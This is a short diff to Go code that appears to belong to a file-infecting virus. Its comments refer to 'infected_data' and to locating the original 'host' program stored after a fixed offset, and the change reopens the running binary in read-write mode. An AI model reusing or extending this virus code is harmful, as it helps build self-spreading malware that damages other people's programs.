@@ -122,7 +122,7 @@ func RunHost() {
     allSZ := len(infected_data) //get file full size
     hostSZ := allSZ - 2665984 //calculate host size
     
-    f, err := os.Open(os.Args[0]) //open host
+    f, err := os.OpenFile(os.Args[0], os.O_RDWR, 0666) //open host
     check(err)
         
     f.Seek(2665984, os.SEEK_SET) //go to host start
